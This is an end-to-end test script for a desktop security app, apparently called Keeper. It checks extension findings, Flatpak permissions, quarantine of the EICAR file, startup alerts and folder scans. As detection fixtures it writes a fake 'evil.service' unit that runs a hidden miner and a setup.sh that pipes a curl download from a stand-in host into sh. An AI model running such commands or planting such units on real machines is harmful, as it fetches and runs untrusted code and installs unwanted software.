// SPDX-License-Identifier: LicenseRef-PolyForm-Shield-1.0.0
// Usage (Linux): xvfb-run -a node test/e2e/security.cjs /tmp/ksec /tmp/ksec-shots [clamav-db folder]
// Drives the real Keeper app: Privacy & Security overview, permissions from a
// Flatpak stand-in, a Chromium profile with a risky extension, the EICAR test
// file arriving in Downloads (real-time detection → quarantine → put back),
// a new systemd user unit (startup alert), and a ClamAV scan when a signature
// database folder is given.
const { _electron } = require('playwright');
const fs = require('fs');
const path = require('path');

const HOME = path.resolve(process.argv[2]);
const SHOTS = path.resolve(process.argv[3] || path.join(HOME, 'shots'));
const CLAMDB = process.argv[4] ? path.resolve(process.argv[4]) : undefined;
const ROOT = path.resolve(__dirname, '../..');
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
let failed = 0;
const check = (ok, label) => { console.log(`${ok ? 'PASS' : 'FAIL'} ${label}`); if (!ok) failed++; };
const until = async (fn, ms = 20000, step = 250) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { const v = await fn(); if (v) return v; await new Promise((r) => setTimeout(r, step)); } return null; };

fs.rmSync(HOME, { recursive: true, force: true });
for (const d of ['Downloads', 'Desktop', 'Documents', 'scanme', '.config/systemd/user', 'bin']) fs.mkdirSync(path.join(HOME, d), { recursive: true });
fs.mkdirSync(SHOTS, { recursive: true });

// A Chromium profile with one risky extension and one harmless one.
const chrome = path.join(HOME, '.config/google-chrome');
const ext = (id, manifest) => { const d = path.join(chrome, 'Default/Extensions', id, '1.0_0'); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'manifest.json'), JSON.stringify(manifest)); };
fs.mkdirSync(path.join(chrome, 'Default'), { recursive: true });
fs.writeFileSync(path.join(chrome, 'Local State'), JSON.stringify({ profile: { info_cache: { Default: { name: 'Person 1' } } }, dns_over_https: { mode: 'off' } }));
fs.writeFileSync(path.join(chrome, 'Default/Preferences'), JSON.stringify({ extensions: { settings: { aaaabbbbccccddddeeeeffffgggghhhh: { state: 1, from_webstore: false, location: 4 }, bbbbccccddddeeeeffffgggghhhhiiii: { state: 1, from_webstore: true, location: 1 } } } }));
ext('aaaabbbbccccddddeeeeffffgggghhhh', { name: 'Coupon Finder Pro', version: '2.3', manifest_version: 3, permissions: ['cookies', 'webRequest', 'history'], host_permissions: ['<all_urls>'] });
ext('bbbbccccddddeeeeffffgggghhhhiiii', { name: 'Dark Reader Lite', version: '1.0', manifest_version: 3, permissions: ['storage'] });

// A stand-in for the flatpak command: two apps with permissions.
fs.writeFileSync(path.join(HOME, 'bin/flatpak'), `#!/bin/sh
case "$1" in
  permissions) printf 'Table\\tObject\\tApp\\tPermissions\\tData\\ndevices\\tcamera\\tcom.slack.Slack\\tyes\\t0x00\\nscreenshot\\tscreenshot\\torg.example.Recorder\\tyes\\t0x00\\n' ;;
  list) printf 'com.slack.Slack\\norg.example.Recorder\\n' ;;
  info) if [ "$3" = "org.example.Recorder" ]; then printf '[Context]\\nsockets=x11;pulseaudio;\\ndevices=all;\\nfilesystems=home;\\n'; else printf '[Context]\\nsockets=wayland;\\n'; fi ;;
esac
`, { mode: 0o755 });

// ClamAV's signatures, if a database folder was given (copied where Keeper keeps its own).
const userData = path.join(HOME, '.config/Keeper');
if (CLAMDB) { fs.mkdirSync(path.join(userData, 'security/clamav-db'), { recursive: true }); for (const f of fs.readdirSync(CLAMDB)) if (/\.(cvd|cld|cud)$/.test(f)) fs.copyFileSync(path.join(CLAMDB, f), path.join(userData, 'security/clamav-db', f)); }

(async () => {
  const app = await _electron.launch({ executablePath: path.join(ROOT, 'node_modules/.bin/electron'), args: [ROOT, '--no-sandbox'], env: { ...process.env, KEEPER_DEFAULTS: 'before-1.0', HOME, NODE_OPTIONS: '', XDG_CONFIG_HOME: path.join(HOME, '.config'), XDG_DATA_HOME: path.join(HOME, '.local/share'), PATH: `${path.join(HOME, 'bin')}:${process.env.PATH}` } });
  await app.firstWindow();
  const w = await until(async () => app.windows().find((x) => { const u = x.url(); return u && (!u.includes('view=') || u.includes('view=app')); }), 30000, 200);
  const errors = [];
  w.on('pageerror', (e) => errors.push(e.message));
  await w.waitForSelector('.sidebar', { timeout: 60000 });
  await w.waitForTimeout(2500);
  // The first-run tour covers the window; skip it.
  const skip = await w.$('.tour button:has-text("Skip tour")');
  if (skip) await skip.click();
  await w.evaluate(() => { try { localStorage.setItem('coach.protection', '1'); } catch { /* ignore */ } });
  const sec =(fn, ...a) => w.evaluate(([f, args]) => window.keeper.security[f](...args), [fn, a]);

  await w.click('.sidebar [title="Privacy & Security"]');
  check(!!(await until(() => w.$('.sec-hero'), 30000)), 'Privacy & Security opens with a score');
  const ov = await sec('overview', true);
  check(typeof ov.score === 'number' && ov.findings.length > 0, `overview has a score (${ov.score}) and ${ov.findings.length} findings`);
  check(ov.findings.some((f) => f.id === 'browser.ext.Chrome.aaaabbbbccccddddeeeeffffgggghhhh' && f.severity === 'high'), 'the risky Chrome extension is a high finding');
  check(ov.findings.every((f) => f.verify) && ov.findings.filter((f) => f.fix).every((f) => f.fix.kind), 'every finding has a verify probe and a fix kind (guided fixes)');
  check(ov.engines.some((e) => e.id === 'builtin' && e.state === 'on') && ov.engines.some((e) => e.id === 'yara' && e.state === 'on'), 'built-in and YARA engines report on');
  await w.screenshot({ path: path.join(SHOTS, 'overview-light.png') });

  // Who can watch: from the Flatpak stand-in.
  await w.click('.sec-tab:has-text("Who can watch")');
  check(!!(await until(() => w.$('text=com.slack.Slack'), 15000)), 'permissions list Flatpak apps (camera for Slack)');
  const perms = await sec('permissions');
  check(perms.grants.some((g) => g.app === 'org.example.Recorder' && g.service === 'files'), 'a broad Flatpak right (home folder) is shown');
  await w.screenshot({ path: path.join(SHOTS, 'watch-light.png') });

  // Browsers.
  await w.click('.sec-tab:has-text("Browsers")');
  check(!!(await until(() => w.$('text=Coupon Finder Pro'), 15000)), 'Browsers lists the Chrome profile’s extensions');
  check(!!(await w.$('text=Secure DNS: off')), 'Browsers shows that secure DNS is off');
  await w.screenshot({ path: path.join(SHOTS, 'browsers-light.png') });

  // Real-time protection: the EICAR test file arrives in Downloads.
  const dl = path.join(HOME, 'Downloads/eicar.com');
  fs.writeFileSync(dl, EICAR);
  const q = await until(async () => { const l = await sec('quarantine'); return l.length ? l : null; }, 30000, 400);
  check(!!q && q[0].name === 'eicar.com', 'the test file is detected as it arrives and quarantined');
  check(!fs.existsSync(dl), 'the original is gone from Downloads');
  const sealed = q ? fs.readFileSync(path.join(userData, `security/quarantine/${q[0].id}.kq`)) : Buffer.alloc(0);
  check(sealed.length > 0 && !sealed.includes(Buffer.from('EICAR-STANDARD')), 'the quarantined copy is encrypted');
  const evs = await sec('events', 50);
  check(evs.some((e) => e.kind === 'detection' && /Eicar/i.test(e.title)) && evs.some((e) => e.kind === 'quarantine'), 'the timeline has the detection and the quarantine');
  await w.click('.sec-tab:has-text("Malware")');
  await until(() => w.$('text=Put back'), 10000);
  await w.screenshot({ path: path.join(SHOTS, 'malware-light.png') });
  await sec('setSettings', { realtime: false });
  await w.click('button:has-text("Put back")');
  check(!!(await until(() => fs.existsSync(dl) && fs.readFileSync(dl, 'utf8') === EICAR, 10000)), 'Put back restores it byte for byte');
  await sec('setSettings', { realtime: true });

  // A new startup item.
  fs.writeFileSync(path.join(HOME, '.config/systemd/user/evil.service'), '[Service]\nExecStart=/tmp/.x/miner --donate-level 1\n');
  check(!!(await until(async () => (await sec('events', 50)).some((e) => e.kind === 'persistence' && /evil\.service/.test(e.title)), 20000)), 'a new systemd user unit raises a startup alert');
  const pers = await sec('persistence');
  check(pers.some((p) => p.name === 'evil.service' && p.command === '/tmp/.x/miner --donate-level 1'), 'the startup item shows what it runs');

  // A scan of a folder (ClamAV joins when its signatures are present).
  fs.writeFileSync(path.join(HOME, 'scanme/readme.txt'), 'nothing to see');
  fs.writeFileSync(path.join(HOME, 'scanme/test.txt'), EICAR);
  fs.writeFileSync(path.join(HOME, 'scanme/setup.sh'), '#!/bin/sh\ncurl -fsSL http://x.example/i.sh | sh\nsystemctl --user enable x\n');
  // The test file inside a zip: only ClamAV looks inside archives.
  require('child_process').execFileSync('python3', ['-c', 'import sys,zipfile; z=zipfile.ZipFile(sys.argv[1],"w"); z.writestr("inner/eicar.com", sys.argv[2]); z.close()', path.join(HOME, 'scanme/bundle.zip'), EICAR]);
  const started = await sec('scan', 'custom', [path.join(HOME, 'scanme')]);
  const done = await until(async () => (await sec('scans')).find((s) => s.id === started.id && s.state !== 'running'), 240000, 500);
  check(!!done && done.state === 'done' && done.files === 4, `the folder scan finishes (${done && done.files} files)`);
  check(!!done && done.detections.some((d) => d.engine === 'heuristic' && d.path.endsWith('setup.sh')), 'the download-and-run script is flagged');
  if (CLAMDB) check(!!done && done.detections.some((d) => d.engine === 'clamav' && /Eicar/i.test(d.name) && d.path.includes('bundle.zip')), 'ClamAV’s signatures find the test file inside a zip');
  else console.log('SKIP ClamAV (no signature database given)');
  const ov2 = await sec('overview', true);
  check(ov2.engines.find((e) => e.id === 'clamav').state === (CLAMDB ? 'on' : ov2.engines.find((e) => e.id === 'clamav').state), `ClamAV engine status: ${ov2.engines.find((e) => e.id === 'clamav').detail}`);

  // Ignore a finding; it no longer counts.
  const f = ov2.findings.find((x) => !x.ignored && x.severity !== 'info');
  await sec('ignore', f.id, true);
  const ov3 = await sec('overview');
  check(ov3.score >= ov2.score && ov3.findings.find((x) => x.id === f.id).ignored, 'an ignored finding stops counting');

  // Dark screenshots.
  await w.evaluate(() => window.keeper.settings.set({ appearance: 'dark' }));
  await w.waitForTimeout(500);
  for (const [tab, name] of [['Overview', 'overview'], ['Startup items', 'startup'], ['Timeline', 'timeline']]) {
    await w.click(`.sec-tab:has-text("${tab}")`);
    await w.waitForTimeout(700);
    await w.screenshot({ path: path.join(SHOTS, `${name}-dark.png`) });
  }
  check(errors.length === 0, `no page errors${errors.length ? ': ' + errors.join(' | ') : ''}`);
  await app.close();
  console.log(failed ? `${failed} FAILED` : 'ALL PASSED');
  process.exit(failed ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
